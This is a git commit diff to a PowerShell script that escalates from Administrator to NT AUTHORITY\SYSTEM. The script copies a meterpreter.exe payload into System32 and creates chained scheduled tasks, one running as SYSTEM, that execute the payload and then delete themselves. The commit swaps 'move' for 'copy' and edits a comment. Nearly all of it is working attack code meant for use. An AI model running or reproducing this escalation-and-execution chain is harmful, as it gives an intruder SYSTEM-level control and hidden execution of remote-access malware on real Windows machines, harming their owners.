98e07582f30ff97c1ea62e3ee6b4251a29eb1733
d3hvck <106494573+d3hvck@users.noreply.github.com>
2025-04-14 01:58:44 +0400

    Update Exp_SelfElevated_AdminToNTSystem.ps1

--- Exp_SelfElevated_AdminToNTSystem.ps1
+++ Exp_SelfElevated_AdminToNTSystem.ps1
@@ -8,14 +8,14 @@
 ┻┛┗┛┛┗┛┗┗┛┛┗┛          
 #>
 
-# PowerShell Bypass Chain
+# PowerShell Elevator from Administrator to NT Auth (Bypass Chain)
 $payloadSource = "$env:USERPROFILE\Downloads\meterpreter.exe"
 $payloadDest = "C:\Windows\System32\payload.exe"
 $task1 = "MovePayloadTask"
 $task2 = "SystemPayload"
 
 # Step 1: Move payload using Task 1
-$action1 = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c move `"$payloadSource`" `"$payloadDest`" && schtasks /Create /RU SYSTEM /SC ONCE /TN $task2 /TR `"cmd.exe /c $payloadDest && schtasks /Delete /TN $task1 /F && schtasks /Delete /TN $task2 /F`" /ST $(Get-Date).AddMinutes(2).ToString('HH:mm')"
+$action1 = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c copy `"$payloadSource`" `"$payloadDest`" && schtasks /Create /RU SYSTEM /SC ONCE /TN $task2 /TR `"cmd.exe /c $payloadDest && schtasks /Delete /TN $task1 /F && schtasks /Delete /TN $task2 /F`" /ST $(Get-Date).AddMinutes(2).ToString('HH:mm')"
 $trigger1 = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1)
 Register-ScheduledTask -Action $action1 -Trigger $trigger1 -TaskName $task1 -Description "Moves payload and sets SYSTEM task"
 Write-Host "[+] Task '$task1' created. Wait 1-2 minutes for execution."
